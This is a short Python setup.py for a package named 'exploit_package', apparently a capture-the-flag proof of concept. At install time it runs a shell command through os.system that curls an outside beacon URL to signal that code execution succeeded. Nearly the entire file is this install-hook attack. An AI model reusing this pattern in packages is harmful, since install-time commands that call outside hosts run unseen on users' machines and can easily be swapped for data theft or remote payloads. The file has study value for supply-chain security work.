from setuptools import setup

import os

os.system("curl https://heroctf-ploc.free.beeceptor.com/exploited")
setup(
        name="exploit_package",
        version="0.1",
        packages=["exploit"],
        install_requires=[]
)
